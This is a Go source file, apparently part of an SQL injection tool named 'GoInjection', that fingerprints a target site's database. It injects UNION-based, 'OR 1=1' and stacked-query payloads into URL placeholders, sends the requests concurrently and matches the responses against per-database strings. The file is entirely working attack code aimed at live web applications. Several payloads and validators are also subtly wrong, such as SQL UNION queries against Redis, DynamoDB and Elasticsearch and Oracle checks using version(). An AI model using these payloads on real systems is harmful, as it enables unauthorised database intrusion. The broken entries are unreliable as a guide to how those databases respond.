package modules

import (
	"GoInjection/helper"
	"log"
	"strings"
	"sync"
)

type Fingerprint struct {
	Payload   string
	Validator func(response string) bool
}

var fingerprints = map[string]map[string]Fingerprint{
	"union": {
		"PostgresSQL":          {Payload: "' UNION SELECT version() || '::PG' --+", Validator: func(resp string) bool { return strings.Contains(resp, "::PG") }},
		"MySQL":                {Payload: "' UNION SELECT CONCAT('MySQL:', version()) --+", Validator: func(resp string) bool { return strings.Contains(resp, "MySQL:") }},
		"SQLite":               {Payload: "' UNION SELECT 'SQLite:' || sqlite_version() --+", Validator: func(resp string) bool { return strings.Contains(resp, "SQLite:") }},
		"Microsoft SQL Server": {Payload: "' UNION SELECT 1,SERVERPROPERTY('productversion') --+", Validator: func(resp string) bool { return strings.Contains(resp, "productversion") }},
		"Redis":                {Payload: "' UNION SELECT 'Redis:' --+", Validator: func(resp string) bool { return strings.Contains(resp, "Redis:") }},
		"MariaDB":              {Payload: "' UNION SELECT 1,version(),database() --+", Validator: func(resp string) bool { return strings.Contains(resp, "MariaDB") }},
		"ElasticSearch":        {Payload: "' UNION SELECT version() --+", Validator: func(resp string) bool { return strings.Contains(resp, "Elasticsearch") }},
		"Oracle":               {Payload: "' UNION SELECT 1,version(),user() --+", Validator: func(resp string) bool { return strings.Contains(resp, "user") }},
		"DynamoDB":             {Payload: "' UNION SELECT version() --+", Validator: func(resp string) bool { return strings.Contains(resp, "DynamoDB") }},
	},
	"error": {
		"PostgresSQL":          {Payload: "' OR 1=1 --+", Validator: func(resp string) bool { return strings.Contains(resp, "Postgres") }},
		"MySQL":                {Payload: "' OR 1=1 --+", Validator: func(resp string) bool { return strings.Contains(resp, "MySQL") }},
		"SQLite":               {Payload: "' OR 1=1 --+", Validator: func(resp string) bool { return strings.Contains(resp, "SQLite") }},
		"Microsoft SQL Server": {Payload: "' OR 1=1 --+", Validator: func(resp string) bool { return strings.Contains(resp, "SQL Server") }},
		"Redis":                {Payload: "' OR 1=1 --+", Validator: func(resp string) bool { return strings.Contains(resp, "Redis") }},
		"MariaDB":              {Payload: "' OR 1=1 --+", Validator: func(resp string) bool { return strings.Contains(resp, "MariaDB") }},
		"ElasticSearch":        {Payload: "' OR 1=1 --+", Validator: func(resp string) bool { return strings.Contains(resp, "Elasticsearch") }},
		"Oracle":               {Payload: "' OR 1=1 --+", Validator: func(resp string) bool { return strings.Contains(resp, "Oracle") }},
		"DynamoDB":             {Payload: "' OR 1=1 --+", Validator: func(resp string) bool { return strings.Contains(resp, "DynamoDB") }},
	},
	"stacked": {
		"PostgresSQL":          {Payload: "'; SELECT version(),current_database() --+", Validator: func(resp string) bool { return strings.Contains(resp, "current_database") }},
		"MySQL":                {Payload: "'; SELECT 1,version(),database() --+", Validator: func(resp string) bool { return strings.Contains(resp, "version") }},
		"SQLite":               {Payload: "'; SELECT sqlite_version() --+", Validator: func(resp string) bool { return strings.Contains(resp, "sqlite_version") }},
		"Microsoft SQL Server": {Payload: "'; SELECT 1,SERVERPROPERTY('productversion') --+", Validator: func(resp string) bool { return strings.Contains(resp, "productversion") }},
		"Redis":                {Payload: "'; SELECT version() --+", Validator: func(resp string) bool { return strings.Contains(resp, "Redis") }},
		"MariaDB":              {Payload: "'; SELECT 1,version(),database() --+", Validator: func(resp string) bool { return strings.Contains(resp, "MariaDB") }},
		"ElasticSearch":        {Payload: "'; SELECT version() --+", Validator: func(resp string) bool { return strings.Contains(resp, "Elasticsearch") }},
		"Oracle":               {Payload: "'; SELECT 1,version(),user() --+", Validator: func(resp string) bool { return strings.Contains(resp, "user") }},
		"DynamoDB":             {Payload: "'; SELECT version() --+", Validator: func(resp string) bool { return strings.Contains(resp, "DynamoDB") }},
	},
}

func FingerprintDB(url, method string) string {
	if _, ok := fingerprints[method]; !ok {
		log.Printf("Invalid fingerprint method: %s", method)
		return "Invalid fingerprint method"
	}

	cleanedURLs, err := helper.GetUrls(url)
	helper.LogError(err)

	var wg sync.WaitGroup
	var mu sync.Mutex
	var detectedDB string

	for _, cleanedURL := range cleanedURLs {
		wg.Add(1)
		go func(cleanedURL string) {
			defer wg.Done()
			checkFingerprints(cleanedURL, method, &detectedDB, &mu)
		}(cleanedURL)
	}

	wg.Wait()
	return detectedDB
}

func checkFingerprints(cleanedURL, method string, detectedDB *string, mu *sync.Mutex) {
	if detectedDB == nil {
		log.Println("detectedDB pointer is nil")
		return
	}

	for dbType, fp := range fingerprints[method] {
		if fp.Payload == "" {
			log.Printf("Skipping %s due to empty payload", dbType)
			continue
		}

		if !strings.Contains(cleanedURL, helper.PayloadReplaceString) {
			log.Printf("URL does not contain expected placeholder: %s", cleanedURL)
			continue
		}

		encodedPayload := helper.URLEncode(fp.Payload)
		if encodedPayload == "" {
			log.Printf("Failed to encode payload for DB type: %s", dbType)
			continue
		}

		requestURL := strings.Replace(cleanedURL, helper.PayloadReplaceString, encodedPayload, -1)
		response, _ := helper.SendRequest(requestURL)

		if response == "" {
			log.Printf("Empty response for URL: %s", requestURL)
			continue
		}

		if fp.Validator(response) {
			mu.Lock()
			if *detectedDB == "" {
				*detectedDB = dbType
			}
			mu.Unlock()
			return
		}
	}
}
